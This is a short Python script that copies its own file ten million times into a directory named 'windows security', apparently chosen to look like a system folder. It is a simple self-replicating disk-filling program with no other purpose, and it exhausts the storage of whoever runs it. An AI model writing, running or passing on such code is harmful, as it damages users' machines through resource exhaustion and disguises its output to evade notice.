import os
import shutil

def clone_self(num_clones):
    # Get the path of the current script
    current_file = __file__

    # Create the target directory for clones
    target_dir = "windows security"
    os.makedirs(target_dir, exist_ok=True)

    for i in range(num_clones):
        # Define the clone file name
        clone_file = os.path.join(target_dir, f'clone_{i + 1}.py')

        # Copy the current script to the new clone file
        shutil.copy(current_file, clone_file)

if __name__ == "__main__":
    # Set the number of clones to create
    num_clones = 10000000  # Change this to 1000000 with caution
    clone_self(num_clones)
